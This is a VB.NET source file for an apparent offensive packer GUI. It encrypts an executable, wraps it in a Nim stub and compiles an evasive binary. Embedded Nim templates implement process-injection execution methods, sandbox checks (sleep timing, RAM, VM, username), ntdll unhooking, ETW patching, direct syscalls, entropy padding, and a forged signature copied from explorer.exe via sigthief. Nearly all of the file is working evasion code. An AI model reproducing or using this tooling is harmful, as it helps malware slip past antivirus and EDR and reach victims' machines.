Imports System.Reflection.Emit
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows
Imports System.Windows.Forms.DataFormats
Imports System.Windows.Forms.VisualStyles.VisualStyleElement

Public Class fMain

    Private Sub LogToTxtbox(message As String)
        txtOutputLog.Text += message + vbNewLine
    End Sub
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Make form not resizable
        Me.FormBorderStyle = FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.MinimizeBox = True
        ' Initialize default values
        LogToTxtbox("[+] Initializing default values")
        ' Injection methods
        cbInjectionMethod.Items.Add("CreateThread")
        cbInjectionMethod.Items.Add("CreateThread: Suspended -> Wait -> Resume")
        cbInjectionMethod.Items.Add("CreateThreadpoolWait")
        cbInjectionMethod.Items.Add("Callback")
        cbInjectionMethod.Items.Add("Fiber")
        cbInjectionMethod.SelectedIndex = 0
        ' Binary format
        cbBinFormat.Items.Add(".exe")
        cbBinFormat.SelectedIndex = 0
        ' Sandbox
        ' Delay execution
        cbDelayExecution.Items.Add("None")
        cbDelayExecution.Items.Add("Sleep")
        cbDelayExecution.Items.Add("Beep")
        'cbDelayExecution.Items.Add("NtDelayExecution")
        cbDelayExecution.SelectedIndex = 0

        ' EDR
        ' Syscall obfuscation
        cbSysCall.Items.Add("None")
        cbSysCall.Items.Add("Direct SysCalls")
        'cbSysCall.Items.Add("Indirect")
        cbSysCall.SelectedIndex = 0
        LogToTxtbox("[+] GUI ready")

    End Sub

    Private Sub btnGenerateBinary_Click(sender As Object, e As EventArgs) Handles btnGenerateBinary.Click
        txtOutputLog.ForeColor = Color.Lime
        LogToTxtbox("[+] Generating packed binary ...")
        ' create temp file
        ' Set relative path
        Dim strPath As String = IO.Path.Combine(IO.Directory.GetParent(Application.ExecutablePath).FullName, "..\..\..\")
        Dim tempFileContents As String
        Dim tempFilePath As String = strPath + "src\tempStub.nim"

        ' ########## Encrypt and embed ##########
        Dim oProcess As New Process()
        Dim inFile As String = txtFileToBePacked.Text
        Dim inStub As String = strPath + "src\farsideStub.nim"
        Dim oStartInfo As New ProcessStartInfo("nim.exe", "r " + strPath + "src\farsidePacker.nim" +
                                               " " + inFile +
                                               " " + inStub +
                                               " " + tempFilePath)
        Dim outFile As String = txtOutputFileName.Text
        oStartInfo.UseShellExecute = False
        oStartInfo.RedirectStandardOutput = True
        oProcess.StartInfo = oStartInfo
        oProcess.Start()

        Dim sOutput As String
        Using oStreamReader As System.IO.StreamReader = oProcess.StandardOutput
            sOutput = oStreamReader.ReadToEnd()
            LogToTxtbox("[+] Target successfully encrypted and embeded")
        End Using
        ' Check if tests completed successfully
        If sOutput.Contains("[ERROR]") Then
            LogToTxtbox("[ENCRYPT AND EMBED FAILED]")
            Return
        End If
        ' get file contents
        tempFileContents = My.Computer.FileSystem.ReadAllText(tempFilePath)



        ' ########## Execution ##########
        LogToTxtbox("[*] Execution")
        ' Injection method
        Dim injMethod As String = cbInjectionMethod.Items(cbInjectionMethod.SelectedIndex)
        LogToTxtbox("  |-> Injection method: " + vbNewLine + "  |  " + injMethod)
        ' #@@executionType
        If injMethod Is "CreateThread" Then
            tempFileContents = tempFileContents.Replace("#@@executionType@@", sConstCreateThread)
        ElseIf injMethod Is "CreateThread: Suspended -> Wait -> Resume" Then
            tempFileContents = tempFileContents.Replace("#@@executionType@@", sConstCreateThreadSuspended)
        ElseIf injMethod Is "CreateThreadpoolWait" Then
            tempFileContents = tempFileContents.Replace("#@@executionType@@", sConstCreateThreadpoolWait)
        ElseIf injMethod Is "Callback" Then
            tempFileContents = tempFileContents.Replace("#@@executionType@@", sConstCallback)
        ElseIf injMethod Is "Fiber" Then
            tempFileContents = tempFileContents.Replace("#@@executionType@@", sConstFiber)
        End If

        ' Binary format
        Dim binFmt As String = cbBinFormat.Items(cbBinFormat.SelectedIndex)
        LogToTxtbox("  |-> Binary format: " + vbNewLine + "  |  " + binFmt)


        ' ########## Obfuscation ##########
        ' Remove print statements, replace with useless instruction
        Dim r As New System.Text.RegularExpressions.Regex("(echo\s.*)")
        If Not cbKeepPrintMessages.Checked Then
            tempFileContents = "var someRandomStuffForReasons = 0 " + vbNewLine + tempFileContents
            tempFileContents = r.Replace(tempFileContents, "someRandomStuffForReasons = 1 + 1" + vbNewLine)
        End If

        ' Lower entropy using a's
        If cbLowEntropy.Checked Then
            Dim a_string As String = New String("a"c, 500000)

            tempFileContents = "var lower_entropy_string = """ + a_string + " "" " + vbNewLine + tempFileContents
        End If

        ' ########## Sandbox ##########
        LogToTxtbox("[*] Sandbox Evasion")
        ' Delay execution
        Dim delayExecution As String = cbDelayExecution.Items(cbDelayExecution.SelectedIndex)
        If delayExecution IsNot "None" Then
            ' type
            LogToTxtbox("  |-> Delay Executiom type: " + numDelayExecution.Value.ToString() + " seconds")
            If delayExecution Is "Beep" Then
                tempFileContents = tempFileContents.Replace("#@@delayExecution@@", sConstBeep)
            ElseIf delayExecution Is "Sleep" Then
                tempFileContents = tempFileContents.Replace("#@@delayExecution@@", sConstSleep)
            End If
            ' time
            LogToTxtbox("  |-> Delay Executiom by minimum " + numDelayExecution.Value.ToString() + " seconds")
            tempFileContents = tempFileContents.Replace("@@delayTime@@", numDelayExecution.Value.ToString())
        Else
            LogToTxtbox("  |-> Delay Execution: False")
        End If
        ' Check Sleep
        If cbCheckSleep.Checked Then
            LogToTxtbox("  |-> Check Sleep: True")
            tempFileContents = tempFileContents.Replace("#@@sleepCheck@@", sConstCheckSleep)
        Else
            LogToTxtbox("  |-> Check Sleep: False")
        End If
        ' Check RAM
        If cbCheckRAM.Checked Then
            LogToTxtbox("  |-> Check RAM: True")
            tempFileContents = tempFileContents.Replace("#@@checkRam@@", sConstCheckRAM)
        Else
            LogToTxtbox("  |-> Check RAM: False")
        End If
        ' Check for VM
        If cbCheckVM.Checked Then
            LogToTxtbox("  |-> Check VM: True")
            tempFileContents = tempFileContents.Replace("#@@checkVM@@", sConstCheckVM)
        Else
            LogToTxtbox("  |-> Check VM: False")
        End If
        ' Check Username
        If cbCheckUsername.Checked Then
            LogToTxtbox("  |-> Check Username: True")
            tempFileContents = tempFileContents.Replace("#@@checkUsername@@", sConstCheckUsername)
        Else
            LogToTxtbox("  |-> Check Username: False")
        End If


        ' ########## EDR ##########
        LogToTxtbox("[*] EDR Evasion")

        ' Unhook NtDll
        If cbUnhookNtDll.Checked Then
            LogToTxtbox("  |-> Unhook NtDll: True")
            tempFileContents = tempFileContents.Replace("#@@unhookNtDll@@", sConstUnhookNtDll)
        Else
            LogToTxtbox("  |-> Unhook NtDll: False")
        End If

        ' Patch ETW
        If cbPatchETW.Checked Then
            LogToTxtbox("  |-> Patch ETW: True")
            tempFileContents = tempFileContents.Replace("#@@patchETW@@", sConstPatchETW)
        Else
            LogToTxtbox("  |-> Patch ETW: False")
        End If

        ' Wait for user input
        If cbUserInput.Checked Then
            LogToTxtbox("  |-> User input: True")
            tempFileContents = tempFileContents.Replace("#@@userInput@@", sConstUserInput)
        Else
            LogToTxtbox("  |-> User input: False")
        End If

        ' Syscall obfuscation
        Dim syscallObfuscation As String = cbSysCall.Items(cbSysCall.SelectedIndex)
        If syscallObfuscation IsNot "None" Then
            LogToTxtbox("  |-> SysCall obfuscation: " + syscallObfuscation)
            If syscallObfuscation Is "Direct SysCalls" Then
                ' Add function definitions
                tempFileContents = tempFileContents.Replace("#@DirectSyscallsDefinitions", sConstDirectSyscallsDefinition)
                ' VirtualAlloc
                r = New System.Text.RegularExpressions.Regex("pImageBase.*VirtualAllocEx\(.*")
                tempFileContents = r.Replace(tempFileContents, sConstDirectNtAllocateVirtualMemory)
                ' CreateThread
                r = New System.Text.RegularExpressions.Regex("var\sthread\s=\sCreateThread\(.*")
                tempFileContents = r.Replace(tempFileContents, sConstDirectCreateThread)
            End If
        Else
            LogToTxtbox("  |-> SysCall obfuscation: False")
        End If


        ' ########## Compile ##########
        LogToTxtbox("[+] Compile")
        LogToTxtbox("  |-> Saving file")
        ' Save temp file
        If Not System.IO.File.Exists(tempFilePath) = True Then
            Dim file As System.IO.FileStream
            file = System.IO.File.Create(tempFilePath)
            file.Close()
        End If
        My.Computer.FileSystem.WriteAllText(tempFilePath, tempFileContents, False)
        LogToTxtbox("  |-> Compiling")
        ' Compile
        Dim compileCmd As String = "c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out=..\..\..\" + outFile + " " + tempFilePath
        oProcess = New Process()
        oStartInfo = New ProcessStartInfo("nim.exe", compileCmd)
        oStartInfo.UseShellExecute = False
        oStartInfo.RedirectStandardOutput = True
        oProcess.StartInfo = oStartInfo
        oProcess.Start()
        ' Wait untill process is done
        While True
            If oProcess.HasExited Then
                Exit While
            End If
            Threading.Thread.Sleep(1000)
        End While
        ' Cehck for succsssfull run
        If Not My.Computer.FileSystem.FileExists(strPath + outFile) Then
            LogToTxtbox("[ERROR] Something went wrong in compilation")
            txtOutputLog.ForeColor = Color.Red
            Return
        End If

        ' Fake signature
        If cbFakeSignature.Checked Then
            Dim sigthiefCmd As String = strPath + "tools\sigthief.py --sig=C:\Windows\explorer.exe --target=" + strPath + outFile
            oProcess = New Process()
            oStartInfo = New ProcessStartInfo("python.exe", sigthiefCmd)
            oStartInfo.UseShellExecute = False
            oStartInfo.RedirectStandardOutput = True
            oProcess.StartInfo = oStartInfo
            oProcess.Start()
            ' Wait untill process is done
            While True
                If oProcess.HasExited Then
                    Exit While
                End If
                Threading.Thread.Sleep(1000)
            End While
            ' Delete old unsigned file and replace with signed file
            My.Computer.FileSystem.DeleteFile(strPath + outFile)
            My.Computer.FileSystem.MoveFile(strPath + outFile + "_signed", strPath + outFile)
        End If

        ' Delete tmp file
        If Not cbKeepTmpFile.Checked Then
            My.Computer.FileSystem.DeleteFile(tempFilePath)
        End If
        LogToTxtbox("|-> Result can be found at: " + strPath + outFile)
        ' call randomize with new extension
        txtOutputFileName.Text = RandString(20) + cbBinFormat.Items(cbBinFormat.SelectedIndex) ' use extension from form

        LogToTxtbox("[+] DONE! Enjoy!")
        txtOutputLog.SelectionStart = txtOutputLog.Text.Length
        txtOutputLog.ScrollToCaret()
    End Sub

    Private Sub btnBrowse_Click(sender As Object, e As EventArgs) Handles btnBrowse.Click
        Dim fd As OpenFileDialog = New OpenFileDialog()
        Dim strFileName As String

        fd.Title = "Open File Dialog"
        Dim strPath As String = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().CodeBase)
        fd.InitialDirectory = strPath
        fd.Filter = "All files (*.*)|*.*|All files (*.*)|*.*"
        fd.FilterIndex = 2
        fd.RestoreDirectory = True
        If fd.ShowDialog() = DialogResult.OK Then
            strFileName = fd.FileName
            Debug.Print(strFileName)
            txtFileToBePacked.Text = strFileName
        End If
    End Sub

    Function RandString(n As Long) As String
        'Assumes that Randomize has been invoked by caller
        Dim i As Long, j As Long, m As Long, s As String, pool As String
        pool = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        m = Len(pool)
        For i = 1 To n
            j = 1 + Int(m * Rnd())
            s = s & Mid(pool, j, 1)
        Next i
        RandString = s
    End Function

    Private Sub btnRandomize_Click(sender As Object, e As EventArgs) Handles btnRandomize.Click
        LogToTxtbox("[+] Generating rand. name")
        txtOutputFileName.Text = RandString(20) + cbBinFormat.Items(cbBinFormat.SelectedIndex) ' use extension from form
    End Sub

    Private Sub llMediumLink_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles llMediumLink.LinkClicked
        Dim url As String = "https://medium.com/@0x0vid"
        Process.Start("C:\Windows\explorer.exe", url)
    End Sub

    Private Sub llGithubLink_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles llGithubLink.LinkClicked
        Dim url As String = "https://github.com"
        Process.Start("C:\Windows\explorer.exe", url)
    End Sub

    Private Sub llLinkedIn_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles llLinkedIn.LinkClicked
        Dim url As String = "https://www.linkedin.com/in/markstaalsteenberg/"
        Process.Start("C:\Windows\explorer.exe", url)
    End Sub

    Private Sub cbBinFormat_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbBinFormat.SelectedIndexChanged
        ' call randomize with new extension
        LogToTxtbox("[+] Generating rand. name")
        txtOutputFileName.Text = RandString(20) + cbBinFormat.Items(cbBinFormat.SelectedIndex) ' use extension from form
    End Sub

    Private Sub btnClearLog_Click(sender As Object, e As EventArgs) Handles btnClearLog.Click
        txtOutputLog.Clear()
    End Sub

    ' ########## Execution: Process Injection ##########
    Public Const sConstCreateThread As String = "
    var thread = CreateThread(nil, cast[SIZE_T](0), entryPoint, nil, 0, nil)
    WaitForSingleObject(thread, cast[DWORD](0xFFFFFFFFF))
"
    Public Const sConstCreateThreadSuspended As String = "
    var thread = CreateThread(nil, cast[SIZE_T](0), entryPoint, nil, CREATE_SUSPENDED, nil)
    sleep(5000)
    ResumeThread(thread)
    WaitForSingleObject(thread, cast[DWORD](0xFFFFFFFFF))
"
    Public Const sConstCreateThreadpoolWait As String = "
    var event: HANDLE = CreateEvent(nil, false, true, nil)
    var threadPoolWait: PTP_WAIT = CreateThreadpoolWait(cast[PTP_WAIT_CALLBACK](int(ntHeaders.OptionalHeader.AddressOfEntryPoint + cast[ULONGLONG](pImageBase))), nil, nil)
    SetThreadpoolWait(threadPoolWait, event, nil)
    WaitForSingleObject(event, INFINITE)
"
    Public Const sConstCallback As String = "
    # Callback execution: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_callback_bin.nim
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](entryPoint)
    )
"
    Public Const sConstFiber As String = "
    let MasterFiber = ConvertThreadToFiber(NULL)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](entryPoint), NULL)
    SwitchToFiber(xFiber)
"

    ' ########## Obfuscation ##########

    ' ########## Sandbox ##########
    Public Const sConstCheckSleep As String = "
import std/random
import winim
import std/times
import os
import strutils

proc sleepAndCheck*(): bool =
    echo ""[+] Checking Sleep""
    ## Sleeps for an random amount of time and checks the result, if it is to big then we know that there has been some tampering.
    ## and it is likely that there is some sandboxing going on
    randomize() # Initializes the default random number generator with a seed based on random number source.
    let zzz = rand(5000..10000)
    let delta_time = zzz - 500
    let before = now()
    sleep(zzz)
    if (now() - before).inMilliseconds < delta_time:
        return false
    return true

if not sleepAndCheck(): 
    echo ""[-] Sleep failed""
    quit()
"
    Public Const sConstSleep As String = "
import std/random
import winim
import std/times
import os
import strutils

echo ""[+] Sleep""
sleep(@@delayTime@@ * 100)
"
    Public Const sConstBeep As String = "
import std/random
import winim
import std/times
import os
import strutils

echo ""[+] Beep""
Beep(0x25, @@delayTime@@ * 1000)
"

    Public Const sConstCheckRAM As String = "
import std/random
import winim
import std/times
import os
import strutils

proc checkRAM*(): bool =
    echo ""[+] Checking RAM""
    ## Gets the current memory statists available for the machine and checks if less thatn 2GB indicating sandboxing
    ## Reference:
    ## - https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex
    var memStat: MEMORYSTATUSEX 
    memStat.dwLength = 64
    GlobalMemoryStatusEx(addr memStat)
    var totalPhysical = memStat.ullTotalPhys/1073741824 
    if totalPhysical < 2:
        return false
    return true

if not checkRAM(): 
    echo ""[-] RAM is below 2GB""
    quit()
"

    Public Const sConstCheckVM As String = "
import std/random
import winim
import std/times
import os
import strutils

proc isEmulated*(): bool =
    echo ""[+] Checking VirtualAllocExNuma""
    ## Reserves some memory space in the virtual space, but there must be physical memory available
    ## Returns bool if able to allocate
    ## Reference:
    ## - https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
    let currentProcessMem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000, # MEM_COMMIT | MEM_RESERVE
        0x20, # PAGE_EXECUTE_READ
        0)

    if isNil(currentProcessMem):
        return true
    return false

if isEmulated(): 
    echo ""[-] VirtualAllocExNuma check failed""
    quit()
"

    Public Const sConstCheckUsername As String = "
import std/random
import winim
import std/times
import os
import strutils

proc checkUsername*(): bool =
    echo ""[+] Checking username""
    var lpBuffer = newString(UNLEN + 1)
    var size = DWORD lpBuffer.len
    var status = GetUserNameA(&lpBuffer, &size)
    echo ""[+] Current username: "", lpBuffer 
    if lpBuffer.contains(""JohnDoe""):
        return false
    return true

if not checkUsername():
    echo ""[-] Username JohnDoe found""
    quit()
"



    ' ########## EDR ##########
    Public Const sConstDirectSyscallsDefinition As String = "
# http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtReadVirtualMemory.html
var hNtdll = LoadLibraryA(""ntdll"")

type NtAllocateVirtualMemory_t* = proc(
    ProcessHandle: HANDLE, 
    BaseAddress: PVOID,
    ZeroBits: ULONG,
    RegionSize: PULONG,
    AllocationType: ULONG,
    Protect: ULONG
    ): NTSTATUS {.stdcall.}

var MyNtAllocateVirtualMemory*: NtAllocateVirtualMemory_t
MyNtAllocateVirtualMemory = cast[NtAllocateVirtualMemory_t](GetProcAddress(hNtdll, ""NtAllocateVirtualMemory""))

type NtCreateThreadEx_t* = proc(
    ThreadHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: PVOID,
    ProcessHandle: HANDLE,
    lpStartAddress: PVOID,
    lpParameter: PVOID,
    Flags: ULONG,
    StackZeroBits: SIZE_T,
    SizeOfStackCommit: SIZE_T,
    SizeOfStackReserve: SIZE_T,
    lpBytesBuffer:PVOID
    ): NTSTATUS {.stdcall.}
    
var MyNtCreateThreadEx*: NtCreateThreadEx_t
MyNtCreateThreadEx = cast[NtCreateThreadEx_t](GetProcAddress(hNtdll, ""NtCreateThreadEx""))
"
    Public Const sConstDirectCreateThread As String = "
    var thread: HANDLE
    var attributes: OBJECT_ATTRIBUTES
    var status = MyNtCreateThreadEx(
        cast[PHANDLE](addr thread), #ThreadHandle
        cast[ACCESS_MASK](THREAD_ALL_ACCESS), #DesiredAccess
        NULL, #ObjectAttributes
        hProcess, #ProcessHandle
        entryPoint, #StartRoutine
        NULL, #Argument
        FALSE, #CreateFlags
        0, #ZeroBits
        0, #StackSize
        0, #MaximumStackSize
        NULL #AttributeList
        )
"
    Public Const sConstDirectNtAllocateVirtualMemory As String = "
    pImageBase = cast[ptr BYTE](ntHeaders.OptionalHeader.ImageBase)
    var payload_len: SIZE_T = ntHeaders.OptionalHeader.SizeOfImage
    var status: NTSTATUS = MyNtAllocateVirtualMemory(
        hProcess,
        addr pImageBase,
        0,
        cast[PULONG](addr payload_len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    if status:
        echo ""\t|-> MyNtAllocateVirtualMemory: 0x"", toHex(status)
"
    Public Const sConstUnhookNtDll As String = "
# Source: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/unhook.nim
proc toStrings*(bytes: openarray[byte]): string =
    ## Takes byte seq and transforms to string
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc unhookNtDLL() = 
    let low: uint16 = 0
    # need to research if possible to just get this from another file and not directly from local host
    var process: HANDLE = GetCurrentProcess()
    var mi: MODULEINFO 
    var ntdllModule: HMODULE = GetModuleHandleA(""ntdll.dll"")
    echo ""[+] ntdll found at: 0x"", ntdllModule.repr
    GetModuleInformation(process, ntdllModule, mi, cast[DWORD](sizeof(mi)))
    var ntdllBase: LPVOID = mi.lpBaseOfDll
    echo ""[+] ntdll base found at: 0x"", ntdllBase.repr
    echo ""somehting different to throw off string matching""
    var ntdllPath = ""C:\\windows\\system32\\ntdll.dll""
    echo ""[+] reading ntdll from disk @ "", ntdllPath
    var ntdllFile = getOsFileHandle(open(ntdllPath,fmRead))
    # Potentially update this to use BOY ntdll
    echo ""[+] mapping file to object""
    var ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
    if ntdllMapping == 0:
        echo ""[Error] could not map file to object""
        quit(-1)

    var ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if ntdllMappingAddress.isNil:
        echo ""[Error] could not map view of file""
        quit(-1)

    echo ""[+] Get DOS header from hooked ntdll""
    var hookedDosHeader: PIMAGE_DOS_HEADER = cast[PIMAGE_DOS_HEADER](ntdllBase)
    echo ""[+] Get NT header from hooked ntdll""
    var hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)

    echo ""somehting different to throw off string matching""
    echo ""[+] Parsing Section headers""
    echo ""[+] Amount of sections: "", hookedNtHeader.FileHeader.NumberOfSections

    var sec: WORD = 0
    for sec in low ..< hookedNtHeader.FileHeader.NumberOfSections:
        var hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * sec))
        if "".text"" in toStrings(hookedSectionHeader.Name):
            var oldProtection:DWORD = 0
            echo ""\t[V] Getting memory protection""
            var isProtected:bool = VirtualProtect(cast[LPVOID](cast[DWORD_PTR](ntdllBase) + cast[DWORD_PTR](hookedSectionHeader.VirtualAddress)), hookedSectionHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            echo ""\t[V] Copying to memory""
            copyMem(
                cast[LPVOID]((cast[DWORD_PTR](ntdllBase) + cast[DWORD_PTR](hookedSectionHeader.VirtualAddress))),
                cast[LPVOID]((cast[DWORD_PTR](ntdllMappingAddress) + cast[DWORD_PTR](hookedSectionHeader.VirtualAddress))), 
                hookedSectionHeader.Misc.VirtualSize);
            isProtected = VirtualProtect(
                cast[LPVOID](cast[DWORD_PTR](ntdllBase) + cast[DWORD_PTR](hookedSectionHeader.VirtualAddress)), 
                hookedSectionHeader.Misc.VirtualSize, 
                oldProtection, 
                &oldProtection)
    echo ""[+] Ntdll should be unhooked... good luck... closing files and handles""
    CloseHandle(process)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    FreeLibrary(ntdllModule)
"
    Public Const sConstPatchETW As String = "
# source: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/etw_patch_bin.nim
#[
    Marcello Salvati, S3cur3Th1sSh1t, Twitter: @byt3bl33d3r, @Shitsecure
    License: BSD 3-Clause
]#

import winim/lean
import strformat
import dynlib

when defined amd64:
    echo ""[*] Running in x64 process""
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    echo ""[*] Running in x86 process""
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib(""ntdll"")
    if isNil(ntdll):
        echo ""[X] Failed to load ntdll.dll""
        return disabled

    cs = ntdll.symAddr(""EtwEventWrite"") # equivalent of GetProcAddress()
    if isNil(cs):
        echo ""[X] Failed to get the address of 'EtwEventWrite'""
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo ""[*] Applying patch""
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    var success = Patchntdll()
    echo fmt""[*] ETW blocked by patch: {bool(success)}""
"

    Public Const sConstUserInput As String = "
echo ""Press [Enter] to continue""; var randomStringToPreventOverlap = readLine(stdin);
"
End Class
